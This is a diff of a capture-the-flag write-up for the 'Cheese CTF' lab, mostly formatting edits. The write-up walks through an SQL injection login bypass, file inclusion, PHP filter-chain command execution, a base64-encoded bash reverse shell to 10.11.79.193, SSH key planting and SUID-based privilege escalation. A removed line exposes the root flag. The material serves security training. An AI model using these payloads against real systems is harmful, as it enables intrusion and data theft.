@@ -32,11 +32,13 @@ Cheese CTF is a (not so) easy challenge with different extra flavours. Starting 
 #### nuclei
 
 Command:
+
 ```sh
 nuclei -u http://10.10.215.157
 ```
 
 Results:
+
 ```sh
 [INF] Current nuclei version: v3.3.2 (outdated)
 [INF] Current nuclei-templates version: v10.0.0 (latest)
@@ -74,11 +76,13 @@ Results:
 #### ffuf
 
 Command:
+
 ```sh
 ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.215.157/FUZZ
 ```
 
 Results:
+
 ```sh
 server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 59ms]
 ```
@@ -89,6 +93,7 @@ server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration:
 1. Since we don't have many information to work with, we can try to manually explore the app. First stop is the login page where I tried a couple of payloads and one SQLi payload worked to bypass the login `test'||1=1;-- -`
 2. With login bypassed we land on a secret panel like `http://10.10.213.211/secret-script.php?file=supersecretadminpanel.html`
 3. First thing I've tried was to replace the loaded HTML with a server path like `/etc/passwd` similar to `http://10.10.213.211/secret-script.php?file=/etc/passwd` and worked:
+
 ```sh
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -147,9 +152,7 @@ $conn = new mysqli($servername, $user, $password, $dbname);
 if ($conn->connect_error) {
     echo $conn->connect_error;
     die("Connection failed: " . $conn->connect_error);
-
 }
-
 // Handle form submission
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $username = $_POST["username"];
@@ -157,15 +160,13 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     function filterOrVariations($input) {
      //Use case-insensitive regular expression to filter 'OR', 'or', 'Or', and 'oR'
     $filtered = preg_replace('/\b[oO][rR]\b/', '', $input);
-    
     return $filtered;
 }
     $filteredInput = filterOrVariations($username);
     //echo($filteredInput);
     // Hash the password (you should use a stronger hashing algorithm)
     $hashed_password = md5($pass);
-    
-    
+
     // Query the database to check if the user exists
     $sql = "SELECT * FROM users WHERE username='$filteredInput' AND password='$hashed_password'";
     $result = $conn->query($sql);
@@ -186,6 +187,7 @@ $conn->close();
 ```
 7. Checking the PHP script we can see the DB user details in clear (user/password) and see the hashing algorithm used for storing passwords in DB is MD5 
 8. Another interesting file to check is `secret-script.php`:
+
 ```sh
 <?php
   //echo "Hello World";
@@ -197,14 +199,17 @@ $conn->close();
 ```
 9. After I tried to manually chain all the possible PHP wrappers, I found a tool for the job, a great resource PHP filter chain generator: https://github.com/synacktiv/php_filter_chain_generator
 10. With the tool set up and in place I have generated first POC, a simple PHP script`<?php phpinfo(); ?>` transformed with the tool like `python3 php_filter_chain.py --chain '<?php phpinfo(); ?>  '` and the output I appended as a value to my vulnerable URL parameter (no need to display the entire string)
+
 ```sh
 http://10.10.7.200/secret-script.php?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|[...]
 ```
 11. Now we need a way to run commands, and for this we can use a simple PHP script and run it with the parameter. Using the same technique as before I have converted the simple PHP file ```<?=`$_GET[cmd]`?>``` and run it with `cmd` parameter in URL like:
+
 ```sh
 http://10.10.93.52/secret-script.php?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.[....]&cmd=whoami
 ```
 12. Now we have in place a method to run commands, next step will be to get a reverse shell. For this we can use a simple shell like `bash -i >& /dev/tcp/10.11.79.193/4455 0>&1` but because when I tried to add it as a value of `cmd` parameter in URL conflicted because of special chars, we need to first encode the payload and use a command to decode on the server and run it `echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMS43OS4xOTMvNDQ1NSAwPiYx|base64 -d|bash` and than URL encode it resulting in a URL like:
+
 ```sh
 http://10.10.93.52/secret-script.php?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&cmd=%65%63%68%6f%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%53%34%33%4f%53%34%78%4f%54%4d%76%4e%44%51%31%4e%53%41%77%50%69%59%78%7c%62%61%73%65%36%34%20%2d%64%7c%62%61%73%68
 ```
@@ -227,13 +232,15 @@ echo 'content copied of the id_rsa.pub' > /home/comte/.ssh/authorized_keys
 ```
 #### Data exfiltration
 1. With the keys in place we can SSH as `comte` from our local machine
-```
+
+```sh
 ssh comte@10.10.93.52 -i id_rsa
 ```
 2. Once on the machine we can get the content of the user flag: **[UserFlag]**
 
 ### Privilege escalation
 1. Run a simple `sudo -l` will return:
+
 ```sh
 User comte may run the following commands on cheesectf:
     (ALL) NOPASSWD: /bin/systemctl daemon-reload
@@ -243,6 +250,7 @@ User comte may run the following commands on cheesectf:
 ```
 2. The same `exploit.timer` service was flagged `linpeas.sh` when we run it
 3. Checking the `exploit.service` will reveal:
+
 ```sh
 comte@cheesectf:/etc/systemd/system$ cat exploit.service 
 [Unit]
@@ -258,6 +266,7 @@ ExecStart=/bin/bash -c "/bin/cp /usr/bin/xxd /opt/xxd && /bin/chmod +sx /opt/xxd
 7. The problem is related to `exploit.timer` config where the `OnBootSec=` value is missing
 8. Update the value to `OnBootSec=0` by editing the file with `nano` and start the service again
 9. Check the content of `/opt` folder where an instance of `xxd` with SUID bit set should be available:
+
 ```sh
 comte@cheesectf:/opt$ ls -la
 total 28
@@ -267,16 +276,18 @@ drwxr-xr-x 19 root root  4096 Sep 27  2023 ..
 ```
 #### Data exfiltration
 1. Now let's follow the GTFOBins (link above) instructions and try to read the content of root.txt file. For this, first we need to set the file path as value for a variable, then try to read it like:
+
 ```sh
 LFILE=/root/root.txt
 ./xxd "$LFILE" | xxd -r
 ```
-2. The root flag is: THM{dca75486094810807faf4b7b0a929b11e5e0167c}
+2. The root flag is **[RootFlag]** :)
 
 ## Addendum
 1. The application is protected by a type of WAF, as per what `nuclei found` is `[waf-detect:apachegeneric] [http] [info] http://10.10.215.157` so any normal scann with `nmap` or `naabu` will not help
 2. I was lucky enough to to find the SQLi payload, but a different approach will be to run the `sqlmap` on the login form and you'll find the same result
 3. Continuing with `sqlmap` you can exfiltrate the content of `users` table, but this is a rabbit hole, you can't un-hash the MD5 password with regular dictionaries (including rockyou.txt)
+
 ```sh
 +----+----------------------------------+----------+
 | id | password                         | username |
@@ -285,6 +296,7 @@ LFILE=/root/root.txt
 +----+----------------------------------+----------+
 ```
 2. I spent some time trying to use the credentials discovered inside `login.php`, with no luck
+
 ```sh
 // Replace these with your database credentials
 $servername = "localhost";
